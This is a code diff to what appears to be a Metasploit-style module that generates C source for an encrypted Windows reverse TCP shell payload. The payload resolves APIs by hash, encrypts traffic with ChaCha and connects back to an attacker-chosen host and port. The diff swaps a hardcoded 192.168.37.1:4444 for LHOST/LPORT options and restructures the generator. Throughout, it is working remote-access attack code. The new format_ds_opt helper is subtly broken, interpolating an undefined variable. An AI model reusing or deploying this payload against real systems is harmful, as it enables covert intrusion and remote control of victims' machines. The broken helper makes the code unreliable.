@@ -33,7 +33,9 @@ module Payload::Windows::EncryptedReverseTcp
   def generate(opts={})
     conf =
     {
-      call_wsastartup: datastore['CallWSAStartup']
+      call_wsastartup: datastore['CallWSAStartup'],
+      port:            format_ds_opt(datastore['LPORT']),
+      host:            format_ds_opt(datastore['LHOST'])
     }
 
     # c source code must be generated first,
@@ -49,15 +51,26 @@ module Payload::Windows::EncryptedReverseTcp
       src << init_winsock
     end
 
-    src << chacha_key
-    src << c_code
-    src << execute_payload
-
-    src
+    src << comm_setup
+    src << get_load_library
+    src << call_init_winsock if conf[:call_wsastartup]
+    src << start_comm
   end
 
   def get_hash(lib, func)
     Rex::Text.block_api_hash(lib, func)
+  end
+
+  #
+  # Options such as the LHOST and PORT
+  # need to become a null-terminated array
+  # to ensure they exist in the .text section.
+  #
+  def format_ds_opt(opt)
+    modified = ''
+
+    opt.split('').each { |elem| modified << "\'#{e}\', " }
+    modified = "#{modified} 0"
   end
 
   def headers
@@ -98,7 +111,7 @@ module Payload::Windows::EncryptedReverseTcp
     ^
   end
 
-  def c_code
+  def comm_setup
     %Q^
       char *chacha_data(char *buf, int len)
       {
@@ -259,7 +272,7 @@ module Payload::Windows::EncryptedReverseTcp
   #
   # ExecutePayload acts as the main function of the c program
   #
-  def execute_payload
+  def get_load_library
     %Q^
       void ExecutePayload(VOID)
       {
@@ -272,16 +285,26 @@ module Payload::Windows::EncryptedReverseTcp
         FuncExitProcess ExitProcess = (FuncExitProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'ExitProcess')}); // hash('kernel32.dll', 'ExitProcess') -> 0x56a2b5f0
         FuncCloseHandle CloseHandle = (FuncCloseHandle) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'CloseHandle')}); // hash('kernel32.dll', 'CloseHandle') -> 0x528796c6
 
-        char ip[] = { '1', '9', '2', '.', '1', '6', '8', '.', '3', '7', '.', '1', 0 };
-        char port[] = { '4', '4', '4', '4', 0 };
+        char ip[] = { #{host} };
+        char port[] = { #{port} };
         char ws2[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
 
         // first get address of loadlibrary
         LoadALibrary = (FuncLoadLibraryA) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'LoadLibrary')}); // hash('kernel32.dll', 'LoadLibrary') -> 0x0726774C
         LoadALibrary((LPTSTR) ws2);
+      ^
+  end
+
+  def call_init_winsock
+    %Q^
 
         init_winsock();
 
+    ^
+  end
+
+  def start_comm
+    %Q^
         // set up a socket
         struct addrinfo *info = NULL;
         info = conn_info_setup(ip, port);
@@ -309,13 +332,6 @@ module Payload::Windows::EncryptedReverseTcp
       }
 
     ^
-  end
-
-  #
-  # need to make the ip addr and port
-  # a null-terminated array
-  #
-  def format_options(data)
   end
 end
 end
